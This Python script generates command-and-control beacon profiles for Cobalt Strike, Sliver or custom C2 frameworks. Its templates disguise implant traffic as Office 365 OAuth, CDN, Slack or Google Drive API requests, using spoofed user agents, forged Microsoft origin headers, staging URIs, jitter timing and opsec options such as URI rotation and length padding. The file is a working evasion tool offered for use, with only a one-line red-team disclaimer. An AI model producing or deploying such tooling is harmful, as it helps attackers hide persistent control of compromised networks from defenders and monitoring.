#!/usr/bin/env python3
"""
http_c2_profile_gen.py - Generate C2 HTTP malleable profiles to blend with legitimate traffic.
Produces Cobalt Strike / Sliver / custom C2 profile configs with traffic masquerading.

Usage:
    python scripts/http_c2_profile_gen.py --template office365 --output c2_profile.json
    python scripts/http_c2_profile_gen.py --template cdn     --output c2_profile.json
    python scripts/http_c2_profile_gen.py --list-templates
"""
import argparse
import json
import random
import sys

TEMPLATES = {
    "office365": {
        "description": "Masquerade as Microsoft Office 365 traffic",
        "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
        "headers": {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "X-Office-Version": "16.0.17830.20000",
            "X-Correlation-Id": "{random_guid}",
            "Origin": "https://login.microsoftonline.com",
            "Referer": "https://login.microsoftonline.com/"
        },
        "beacon_uri": ["/common/oauth2/token", "/common/oauth2/devicecode", "/me/messages"],
        "staging_uri": ["/common/userrealm/", "/GetMicrosoftApplicationToken"],
        "beacon_interval": 60,
        "jitter": 30,
        "encoding": "base64",
        "data_key": "access_token",
        "response_header": "X-MS-Correlation-Request-Id",
    },
    "cdn": {
        "description": "Masquerade as CDN/static asset traffic",
        "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
        "headers": {
            "Accept": "text/css,*/*;q=0.1",
            "Accept-Encoding": "gzip, deflate",
            "Cache-Control": "max-age=0",
            "Pragma": "no-cache",
        },
        "beacon_uri": ["/assets/v2/bundle.min.js", "/static/dist/main.css", "/cdn-static/core.js"],
        "staging_uri": ["/assets/config.json", "/static/manifest.json"],
        "beacon_interval": 30,
        "jitter": 15,
        "encoding": "hex",
        "data_key": "etag",
        "response_header": "X-Cache-Status",
    },
    "slack": {
        "description": "Masquerade as Slack workspace API traffic",
        "useragent": "Slack-Desktop/4.35.131 (10.0.22621)",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "X-Slack-Version": "4.35.131",
        },
        "beacon_uri": ["/api/rtm.connect", "/api/channels.history", "/api/chat.postMessage"],
        "staging_uri": ["/api/auth.test", "/api/users.info"],
        "beacon_interval": 10,
        "jitter": 5,
        "encoding": "base64",
        "data_key": "message",
        "response_header": "X-Slack-Request-Timestamp",
    },
    "googledrive": {
        "description": "Masquerade as Google Drive API traffic",
        "useragent": "Google-Drive-Backup/1.50.0 (Windows 10.0)",
        "headers": {
            "Accept": "application/json",
            "X-Goog-Api-Client": "gdcl/2.0.0 gl-python/3.11.0",
        },
        "beacon_uri": ["/drive/v3/files", "/upload/drive/v3/files", "/drive/v3/changes"],
        "staging_uri": ["/drive/v3/about", "/drive/v3/teamdrives"],
        "beacon_interval": 45,
        "jitter": 20,
        "encoding": "base64url",
        "data_key": "pageToken",
        "response_header": "X-GUploader-UploadID",
    }
}

SLEEP_JITTER_CODE = """
import time, random
def beacon_sleep(interval={interval}, jitter_pct={jitter}):
    j = interval * (jitter_pct / 100) * random.uniform(-1, 1)
    sleep_for = max(1, interval + j)
    time.sleep(sleep_for)
"""

def generate_profile(template_name: str, output_path: str):
    if template_name not in TEMPLATES:
        print(f"[-] Unknown template: {template_name}. Use --list-templates"); sys.exit(1)

    tmpl = TEMPLATES[template_name].copy()
    profile = {
        "meta": {
            "template": template_name,
            "description": tmpl.pop("description"),
            "generated": True,
            "warning": "For authorized red team use only. Must have written engagement proof."
        },
        "http": {
            "useragent": tmpl["useragent"],
            "headers": tmpl["headers"],
            "beacon_uris": tmpl["beacon_uri"],
            "staging_uris": tmpl["staging_uri"],
            "encoding": tmpl["encoding"],
            "data_key": tmpl["data_key"],
            "response_header": tmpl["response_header"],
        },
        "timing": {
            "beacon_interval_seconds": tmpl["beacon_interval"],
            "jitter_percent": tmpl["jitter"],
        },
        "sleep_code": SLEEP_JITTER_CODE.format(
            interval=tmpl["beacon_interval"],
            jitter=tmpl["jitter"]
        ),
        "opsec": {
            "rotate_uri_on_each_beacon": True,
            "rotate_random_header_values": True,
            "randomize_content_length_padding": True,
        }
    }

    with open(output_path, "w") as f:
        json.dump(profile, f, indent=2)
    print(f"[+] Profile '{template_name}' written to {output_path}")
    print(f"[+] Beacon interval: {tmpl['beacon_interval']}s ± {tmpl['jitter']}%")
    print(f"[+] User-Agent: {tmpl['useragent'][:60]}...")


def main():
    p = argparse.ArgumentParser(description="C2 HTTP malleable profile generator")
    p.add_argument("--template", help="Template name")
    p.add_argument("--output", default="c2_profile.json")
    p.add_argument("--list-templates", action="store_true")
    args = p.parse_args()

    if args.list_templates:
        print("Available templates:")
        for name, tmpl in TEMPLATES.items():
            print(f"  {name:<20} {tmpl['description']}")
        return

    if not args.template:
        print("[-] --template required"); sys.exit(1)
    generate_profile(args.template, args.output)


if __name__ == "__main__":
    main()
